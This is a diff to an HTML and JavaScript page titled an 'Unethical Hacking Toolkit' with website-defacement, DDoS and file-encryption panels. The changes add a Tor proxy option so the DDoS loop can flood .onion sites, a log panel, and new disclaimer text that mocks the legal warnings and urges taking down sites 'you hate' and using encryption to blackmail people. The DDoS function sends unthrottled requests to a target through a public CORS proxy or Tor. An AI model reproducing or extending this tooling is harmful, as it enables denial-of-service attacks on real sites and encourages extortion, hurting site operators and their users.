@@ -13,6 +13,7 @@
              padding: 0;
              overflow: hidden;
          }
+ 
 
          body::before {
              content: "";
@@ -25,6 +26,7 @@
              z-index: 1;
              pointer-events: none;
          }
+ 
 
          #particles-js {
              position: fixed;
@@ -32,6 +34,7 @@
              height: 100%;
              z-index: 0;
          }
+ 
 
          .container {
              position: relative;
@@ -43,17 +46,20 @@
              border: 1px solid #00ff00;
              box-shadow: 0 0 10px #00ff00;
          }
+ 
 
          h1, h2 {
              color: #ff0000;
              text-align: center;
          }
+ 
 
          section {
              margin-bottom: 20px;
              border: 1px solid #00ff00;
              padding: 10px;
          }
+ 
 
          button, input[type="text"], input[type="file"], textarea {
              background-color: #333;
@@ -64,11 +70,13 @@
              cursor: pointer;
              transition: background-color 0.3s, color 0.3s;
          }
+ 
 
          button:hover {
              background-color: #00ff00;
              color: #000;
          }
+ 
 
          #defacement-preview {
              border: 1px solid #00ff00;
@@ -77,16 +85,19 @@
              background-color: #222;
              color: #00ff00;
          }
+ 
 
          .warning {
              color: yellow;
              font-weight: bold;
          }
+ 
 
          .disclaimer {
              color: red;
              font-size: 0.8em;
          }
+ 
 
          .sidebar {
              position: fixed;
@@ -99,12 +110,14 @@
              z-index: 3;
              padding-top: 20px;
          }
+ 
 
          .sidebar ul {
              list-style-type: none;
              padding: 0;
              margin: 0;
          }
+ 
 
          .sidebar li {
              padding: 10px;
@@ -113,26 +126,31 @@
              border-bottom: 1px solid #00ff00;
              transition: background-color 0.3s, color 0.3s;
          }
+ 
 
          .sidebar li:hover {
              background-color: #00ff00;
              color: #000;
          }
+ 
 
          .content {
              margin-left: 220px;
              padding: 20px;
          }
+ 
 
          .logo {
              text-align: center;
              margin-bottom: 20px;
          }
+ 
 
          .logo img {
              width: 150px;
              height: auto;
          }
+ 
 
          .modal {
              display: none;
@@ -145,6 +163,7 @@
              overflow: auto;
              background-color: rgba(0, 0, 0, 0.8);
          }
+ 
 
          .modal-content {
              background-color: #333;
@@ -154,6 +173,7 @@
              width: 80%;
              color: #00ff00;
          }
+ 
 
          .close {
              color: #00ff00;
@@ -162,6 +182,7 @@
              font-weight: bold;
              cursor: pointer;
          }
+ 
 
          .close:hover,
          .close:focus {
@@ -169,11 +190,127 @@
              text-decoration: none;
              cursor: pointer;
          }
+         .log-container {
+             position: fixed;
+             bottom: 0;
+             left: 0;
+             width: 100%;
+             background-color: rgba(0, 0, 0, 0.8);
+             color: #00ff00;
+             padding: 10px;
+             font-size: 0.8em;
+             z-index: 5;
+             border-top: 1px solid #00ff00;
+             height: 100px;
+             overflow-y: scroll;
+         }
+ 
+
+         #log {
+             margin: 0;
+             padding: 0;
+             list-style-type: none;
+         }
+ 
+
+         #log li {
+             margin-bottom: 5px;
+         }
+ 
+
+         /* Custom color scheme */
+         body {
+             background-color: #1a1a1a; /* Darker background */
+             color: #a3a3a3; /* Lighter text */
+         }
+ 
+
+         .container {
+             background-color: rgba(26, 26, 26, 0.8); /* Dark container */
+             border: 1px solid #4d4d4d; /* Darker border */
+             box-shadow: 0 0 10px #4d4d4d; /* Darker shadow */
+         }
+ 
+
+         h1, h2 {
+             color: #800080; /* Purple */
+         }
+ 
+
+         section {
+             border: 1px solid #4d4d4d; /* Darker border */
+         }
+ 
+
+         button, input[type="text"], input[type="file"], textarea {
+             background-color: #4d4d4d; /* Darker input fields */
+             color: #a3a3a3; /* Lighter text */
+             border: 1px solid #800080; /* Purple border */
+         }
+ 
+
+         button:hover {
+             background-color: #00008b; /* Dark blue */
+             color: #fff; /* White text */
+         }
+ 
+
+         #defacement-preview {
+             background-color: #333; /* Darker preview background */
+             color: #a3a3a3; /* Lighter text */
+         }
+ 
+
+         .warning {
+             color: #ffcc00; /* Slightly different yellow */
+         }
+ 
+
+         .sidebar {
+             background-color: rgba(26, 26, 26, 0.9); /* Dark sidebar */
+             border-right: 1px solid #4d4d4d; /* Darker border */
+         }
+ 
+
+         .sidebar li {
+             border-bottom: 1px solid #4d4d4d; /* Darker border */
+         }
+ 
+
+         .sidebar li:hover {
+             background-color: #00008b; /* Dark blue */
+             color: #fff; /* White text */
+         }
+ 
+
+         .modal {
+             background-color: rgba(26, 26, 26, 0.8); /* Dark modal background */
+         }
+ 
+
+         .modal-content {
+             background-color: #4d4d4d; /* Darker modal content background */
+             border: 1px solid #800080; /* Purple border */
+             color: #a3a3a3; /* Lighter text */
+         }
+ 
+
+         .close {
+             color: #800080; /* Purple close button */
+         }
+ 
+
+         .close:hover,
+         .close:focus {
+             color: #fff; /* White text */
+         }
      </style>
  </head>
  <body>
+ 
 
  <div id="particles-js"></div>
+ 
 
  <div class="sidebar">
      <div class="logo">
@@ -186,62 +323,71 @@
          <li onclick="showSection('reporting')">Reporting</li>
      </ul>
  </div>
+ 
 
  <div class="content">
      <div class="container">
          <h1>Noodles Inc. - Unethical Hacking Toolkit</h1>
-         <p class="warning">WARNING: Unauthorized use of these tools is illegal. Noodles Inc. is not responsible for your actions.</p>
+         <p class="warning">WARNING: Unauthorized use of these tools is illegal. Noodles Inc. is not responsible for your actions. Use at your own risk, asshole.</p>
+ 
 
          <!-- Defacement Tool -->
          <section id="defacement" style="display: none;">
              <h2>Defacement Tool</h2>
-             <p>This tool allows you to modify the appearance of websites. Use responsibly. <a href="#" onclick="openModal('defacement-info')">Learn more</a></p>
+             <p>This tool allows you to modify the appearance of websites. Use responsibly... or don't, I don't give a fuck. <a href="#" onclick="openModal('defacement-info')">Learn more</a></p>
              <input type="text" id="defacement-url" placeholder="Target URL">
              <button onclick="backupWebsite()">Backup Website</button>
              <textarea id="defacement-code" placeholder="HTML/JS Code"></textarea>
              <button onclick="previewDefacement()">Preview Defacement</button>
              <div id="defacement-preview"></div>
-             <button onclick="applyDefacement()">ApplyDefacement</button>
+             <button onclick="applyDefacement()">Apply Defacement</button>
          </section>
+ 
 
          <!-- DDoS Tool -->
          <section id="ddos" style="display: none;">
              <h2>DDoS Tool</h2>
-             <p>This tool floods a website with traffic, potentially taking it offline. Use responsibly. <a href="#" onclick="openModal('ddos-info')">Learn more</a></p>
+             <p>This tool floods a website with traffic, potentially taking it offline. Use responsibly, or just take down some shit you hate. <a href="#" onclick="openModal('ddos-info')">Learn more</a></p>
              <input type="text" id="ddos-url" placeholder="Target URL">
              <input type="number" id="ddos-threads" placeholder="Threads (1-1000)">
              <button onclick="startDDoS()">Start DDoS</button>
              <button onclick="stopDDoS()">Stop DDoS</button>
              <p>Time Running: <span id="ddos-timer">0</span> seconds</p>
+             <input type="checkbox" id="ddos-onion" name="ddos-onion">
+             <label for="ddos-onion">Target is .onion?</label>
          </section>
+ 
 
          <!-- File Encryption Tool -->
          <section id="encryption" style="display: none;">
              <h2>File Encryption Tool</h2>
-             <p>This tool encrypts files, making them unreadable without the correct key. Use responsibly. <a href="#" onclick="openModal('encryption-info')">Learn more</a></p>
+             <p>This tool encrypts files, making them unreadable without the correct key. Use responsibly, or to blackmail someone, whatever. <a href="#" onclick="openModal('encryption-info')">Learn more</a></p>
              <input type="file" id="encryption-file">
              <input type="text" id="encryption-key" placeholder="Encryption Key">
              <button onclick="backupFile()">Backup File</button>
              <button onclick="encryptFile()">Encrypt File</button>
              <p>Decryption Instructions: <span id="decryption-instructions"></span></p>
          </section>
+ 
 
          <!-- Reporting Tool (Placeholder) -->
          <section id="reporting" style="display: none;">
              <h2>Reporting Tool</h2>
-             <p>Document findings and vulnerabilities. (Feature to be implemented later)</p>
+             <p>Document findings and vulnerabilities. (Feature to be implemented later, maybe...)</p>
          </section>
+ 
 
-         <p class="disclaimer">Noodles Inc. is NOT responsible for any misuse of this toolkit. Use at your own risk.</p>
+         <p class="disclaimer">Noodles Inc. is NOT responsible for any misuse of this toolkit. Use at your own risk, you dumbass.</p>
      </div>
  </div>
+ 
 
  <!-- Modals for educational information -->
  <div id="defacement-info" class="modal">
      <div class="modal-content">
          <span class="close" onclick="closeModal('defacement-info')">&times;</span>
          <h2>Defacement Tool Information</h2>
-         <p>The Defacement Tool allows you to modify the visual appearance of websites by injecting custom HTML and JavaScript code. This can be used to test a website's security vulnerabilities or, unethically, to alter the site's content without authorization. Remember, unauthorized defacement is illegal.</p>
+         <p>The Defacement Tool allows you to modify the visual appearance of websites by injecting custom HTML and JavaScript code. This can be used to test a website's security vulnerabilities or, unethically, to alter the site's content without authorization. Remember, unauthorized defacement is illegal... but who cares? </p>
          <h3>How it Works:</h3>
          <ul>
              <li><b>URL Input:</b> Enter the target website's URL.</li>
@@ -250,15 +396,16 @@
              <li><b>Preview Defacement:</b> Preview the changes to ensure they appear as intended.</li>
              <li><b>Apply Defacement:</b> Inject the code into the website (requires bypassing CORS and other security measures).</li>
          </ul>
-         <p><b>Disclaimer:</b> Misuse of this tool can lead to severe legal consequences. Use responsibly and only on websites you own or have explicit permission to modify.</p>
+         <p><b>Disclaimer:</b> Misuse of this tool can lead to severe legal consequences. Use responsibly and only on websites you own or have explicit permission to modify... or don't, I'm not the police.</p>
      </div>
  </div>
+ 
 
  <div id="ddos-info" class="modal">
      <div class="modal-content">
          <span class="close" onclick="closeModal('ddos-info')">&times;</span>
          <h2>DDoS Tool Information</h2>
-         <p>The DDoS (Distributed Denial of Service) Tool is designed to flood a website with traffic, overwhelming its servers and potentially taking it offline. This tool is intended for stress-testing and evaluating the resilience of web infrastructure, not for malicious purposes. Unauthorized DDoS attacks are illegal and can result in severe penalties.</p>
+         <p>The DDoS (Distributed Denial of Service) Tool is designed to flood a website with traffic, overwhelming its servers and potentially taking it offline. This tool is intended for stress-testing and evaluating the resilience of web infrastructure, not for malicious purposes... yeah, right. Unauthorized DDoS attacks are illegal and can result in severe penalties.</p>
          <h3>How it Works:</h3>
          <ul>
              <li><b>URL Input:</b> Enter the target website's URL.</li>
@@ -267,9 +414,10 @@
              <li><b>Stop DDoS:</b> Halt the attack and stop sending requests.</li>
              <li><b>Timer:</b> Displays the duration of the attack in seconds.</li>
          </ul>
-         <p><b>Disclaimer:</b> Conducting unauthorized DDoS attacks is illegal and can result in severe legal consequences. This tool should only be used for legitimate testing purposes on networks you own or have explicit permission to test.</p>
+         <p><b>Disclaimer:</b> Conducting unauthorized DDoS attacks is illegal and can result in severe legal consequences. This tool should only be used for legitimate testing purposes on networks you own or have explicit permission to test... or not, I don't give a shit.</p>
      </div>
  </div>
+ 
 
  <div id="encryption-info" class="modal">
      <div class="modal-content">
@@ -287,21 +435,41 @@
          <p><b>Disclaimer:</b> Ensure you securely store your encryption keys. Loss of the encryption key will result in permanent loss of access to the encrypted file. Use responsibly and only for authorized purposes.</p>
      </div>
  </div>
+ 
+
+ <div class="log-container">
+     <h2>Log</h2>
+     <ul id="log">
+     </ul>
+ </div>
+ 
 
  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
  <script>
      console.log("Noodles Initialized");
+ 
 
      if (!confirm("WARNING: This toolkit is for educational and security testing purposes ONLY. Unauthorized use is illegal and Noodles Inc. is NOT responsible. Do you accept the risks? Pressing 'No' will close this site.")) {
          window.close();
      }
+ 
 
      function setSecurityHeaders() {
          console.warn("Security Headers need server-side config.");
          // In a real environment, configure these on the server
      }
      setSecurityHeaders();
+ 
+
+     function logAction(message) {
+         const logList = document.getElementById('log');
+         const newLogItem = document.createElement('li');
+         newLogItem.textContent = message;
+         logList.appendChild(newLogItem);
+         logList.scrollTop = logList.scrollHeight;
+     }
+ 
 
      function showSection(sectionId) {
          const sections = ['defacement', 'ddos', 'encryption', 'reporting'];
@@ -310,7 +478,9 @@
          });
          document.getElementById(sectionId).style.display = 'block';
          console.log(`Showing section: ${sectionId}`);
+         logAction(`Showing section: ${sectionId}`);
      }
+ 
 
      // Defacement Tool
      function backupWebsite() {
@@ -320,9 +490,12 @@
              return;
          }
          console.log(`Backing up website: ${url}`);
+         logAction(`Backing up website: ${url}`);
+ 
 
          // Using a CORS proxy for demonstration purposes
          const corsProxy = 'https://corsproxy.io/?';
+ 
 
          fetch(corsProxy + encodeURIComponent(url))
              .then(response => {
@@ -341,18 +514,23 @@
                  document.body.removeChild(a);
                  URL.revokeObjectURL(a.href);
                  console.log('Website backed up successfully.');
+                 logAction('Website backed up successfully.');
              })
              .catch(error => {
                  console.error('Error backing up website:', error);
                  alert('Failed to backup website. Check console for details.');
+                 logAction(`Error backing up website: ${error}`);
              });
      }
+ 
 
      function previewDefacement() {
          const code = document.getElementById('defacement-code').value;
          document.getElementById('defacement-preview').innerHTML = code;
          console.log("Previewing defacement code.");
+         logAction("Previewing defacement code.");
      }
+ 
 
      function applyDefacement() {
          const url = document.getElementById('defacement-url').value;
@@ -362,9 +540,12 @@
              return;
          }
          console.warn(`Attempting to deface: ${url} with code (check console).`);
+         logAction(`Attempting to deface: ${url} with code.`);
+ 
 
          // Using a CORS proxy for demonstration purposes
          const corsProxy = 'https://corsproxy.io/?';
+ 
 
          fetch(corsProxy + encodeURIComponent(url))
              .then(response => {
@@ -376,78 +557,109 @@
              .then(html => {
                  const parser = new DOMParser();
                  const doc = parser.parseFromString(html, 'text/html');
+ 
 
                  if (doc.body) {
                      doc.body.innerHTML = code;
                  } else {
                      console.error('Body element not found.');
                      alert('Could not apply defacement: Body not found.');
+                     logAction('Could not apply defacement: Body not found.');
                      return;
                  }
+ 
 
                  const modifiedHtml = new XMLSerializer().serializeToString(doc);
                  document.getElementById('defacement-preview').innerHTML = modifiedHtml;
                  alert('Defacement applied. Preview updated.');
+                 logAction('Defacement applied. Preview updated.');
              })
              .catch(error => {
                  console.error('Error defacing website:', error);
                  alert('Failed to deface website. Check console.');
+                 logAction(`Error defacing website: ${error}`);
              });
      }
+ 
 
      // DDoS Tool
      let ddosInterval;
      let ddosStartTime;
+ 
 
      function startDDoS() {
          const url = document.getElementById('ddos-url').value;
          const threads = parseInt(document.getElementById('ddos-threads').value) || 1;
+         const isOnion = document.getElementById('ddos-onion').checked;
          if (!url) {
              alert("Please enter a URL.");
              return;
          }
+ 
 
          ddosStartTime = Date.now();
          updateDDoSTimer();
+ 
 
          ddosInterval = setInterval(() => {
              for (let i = 0; i < threads; i++) {
-                 // Using a CORS proxy for demonstration purposes
-                 const corsProxy = 'https://corsproxy.io/?';
-                 fetch(corsProxy + encodeURIComponent(url), { mode: 'no-cors' })
-                     .then(() => console.log(`DDoS: Sent request to ${url}`))
-                     .catch(error => console.error(`DDoS: Error sending request`, error));
+                 let targetUrl = url;
+                 if (isOnion) {
+                     // Tor proxy setup (replace with your Tor proxy)
+                     targetUrl = 'http://127.0.0.1:8118/' + url;
+                 } else {
+                     // Using a CORS proxy for demonstration purposes
+                     targetUrl = 'https://corsproxy.io/?' + encodeURIComponent(url);
+                 }
+                 fetch(targetUrl, { mode: 'no-cors' })
+                     .then(() => {
+                         console.log(`DDoS: Sent request to ${url}`);
+                         logAction(`DDoS: Sent request to ${url}`);
+                     })
+                     .catch(error => {
+                         console.error(`DDoS: Error sending request`, error);
+                         logAction(`DDoS: Error sending request ${error}`);
+                     });
              }
          }, 0);
+ 
 
          console.warn(`Starting DDoS attack on ${url} with ${threads} threads.`);
+         logAction(`Starting DDoS attack on ${url} with ${threads} threads.`);
      }
+ 
 
      function stopDDoS() {
          clearInterval(ddosInterval);
          console.log("DDoS attack stopped.");
+         logAction("DDoS attack stopped.");
      }
+ 
 
      function updateDDoSTimer() {
          if (ddosStartTime) {
              const elapsedTime = Math.floor((Date.now() - ddosStartTime) / 1000);
              document.getElementById('ddos-timer').textContent = elapsedTime;
          }
+ 
 
          if (ddosInterval) {
              setTimeout(updateDDoSTimer, 1000);
          }
      }
+ 
 
      // Encryption Tool
      function backupFile() {
          const fileInput = document.getElementById('encryption-file');
          const file = fileInput.files[0];
+ 
 
          if (!file) {
              alert("Please select a file.");
              return;
          }
+ 
 
          const reader = new FileReader();
          reader.onload = function(e) {
@@ -461,21 +673,26 @@
              a.click();
              document.body.removeChild(a);
              URL.revokeObjectURL(url);
+ 
 
              console.log("File backed up successfully.");
+             logAction("File backed up successfully.");
          };
          reader.readAsArrayBuffer(file);
      }
+ 
 
      function encryptFile() {
          const fileInput = document.getElementById('encryption-file');
          const key = document.getElementById('encryption-key').value;
          const file = fileInput.files[0];
+ 
 
          if (!file || !key) {
              alert("Select a file and enter an encryption key.");
              return;
          }
+ 
 
          const reader = new FileReader();
          reader.onload = function(e) {
@@ -490,21 +707,28 @@
              a.click();
              document.body.removeChild(a);
              URL.revokeObjectURL(url);
+ 
 
              console.log("File encrypted and downloaded.");
+             logAction("File encrypted and downloaded.");
              document.getElementById('decryption-instructions').textContent = `To decrypt, use the same key (${key}) and Noodles File Encryption Tool.`;
          };
          reader.readAsDataURL(file);
      }
+ 
 
      // Modal Functions
      function openModal(modalId) {
          document.getElementById(modalId).style.display = "block";
+         logAction(`Opened modal: ${modalId}`);
      }
+ 
 
      function closeModal(modalId) {
          document.getElementById(modalId).style.display = "none";
+         logAction(`Closed modal: ${modalId}`);
      }
+ 
 
      // Init Particles
      particlesJS('particles-js', {
@@ -579,6 +803,7 @@
          "retina_detect": true
      });
  </script>
+ 
 
  </body>
  </html>
